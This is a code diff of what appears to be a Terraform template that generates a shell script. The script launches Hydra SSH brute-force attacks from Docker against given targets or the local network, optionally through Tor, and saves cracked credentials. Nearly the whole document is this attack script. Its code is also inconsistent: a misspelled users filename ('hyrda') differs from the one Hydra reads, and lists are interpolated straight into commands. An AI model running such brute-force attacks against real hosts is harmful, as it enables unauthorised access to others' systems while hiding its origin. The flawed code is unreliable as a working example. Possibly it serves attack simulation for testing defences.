@@ -26,14 +26,12 @@ locals {
     log "LOCAL_NET: $LOCAL_NET"
     log "Targets: ${join(",", var.targets)}"
     echo "${ length(var.targets) > 0 ? join(",", var.targets) : "$LOCAL_NET" }" > /tmp/hydra-targets.txt
-    cat > /tmp/hyrda_users.txt <<-EOF
-        ${join("\n", var.user_list)}
+    cat > /tmp/hyrda-users.txt <<-EOF
+       ${try(length(var.ssh_user.username),"false") != "false" ? var.ssh_user.username : "" }
     EOF
-    cat /opt/usernames/top-usernames-shortlist.txt >> /tmp/hyrda_users.txt
     cat > /tmp/hydra-passwords.txt <<-EOF
-        ${join("\n", var.password_list)}
+        ${try(length(var.ssh_user.password),"false") != "false" ? var.ssh_user.password : "" }
     EOF
-    cat /opt/passwords/darkweb2017-top10.txt >> /tmp/hydra-passwords.txt
     if [[ `sudo docker ps | grep ${var.container_name}` ]]; then docker stop ${var.container_name}; fi
     ${ var.use_tor == true ? <<-EOF
         log "Using tor network..."
@@ -41,16 +39,20 @@ locals {
             sudo docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy
         fi
         TORPROXY=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' torproxy)
-        log "Running: proxychains hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -M /tmp/hydra-targets.txt ssh
+        log "Running: proxychains hydra -V -L ${var.user_list} -P ${var.password_list} -M /tmp/hydra-targets.txt ssh
         sudo docker stop ${var.container_name}
         sudo docker rm ${var.container_name}
-        sudo docker run -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.container_name} ${var.image} hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -M /tmp/hydra-targets.txt ssh >> /tmp/hydra.txt 2>&1
+        sudo docker run -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.container_name} ${var.image} hydra -V -L ${var.user_list} -P ${var.password_list} -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt ssh >> /tmp/hydra.txt 2>&1
+        sudo docker rm ${var.container_name}
+        sudo docker run -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.container_name} ${var.image} hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt ssh >> /tmp/hydra.txt 2>&1
         EOF
         : <<-EOF
-        log "Running: hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -M /tmp/hydra-targets.txt ssh
+        log "Running: hydra -V -L ${var.user_list} -P ${var.password_list} -M /tmp/hydra-targets.txt ssh
         sudo docker stop ${var.container_name}
         sudo docker rm ${var.container_name}
-        sudo docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.image} -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -M /tmp/hydra-targets.txt ssh >> /tmp/hydra.txt 2>&1
+        sudo docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.image} -L ${var.user_list} -P ${var.password_list} -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt ssh >> /tmp/hydra.txt 2>&1
+        sudo docker rm ${var.container_name}
+        sudo docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.image} -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt ssh >> /tmp/hydra.txt 2>&1
         EOF
     }
     log "Done."
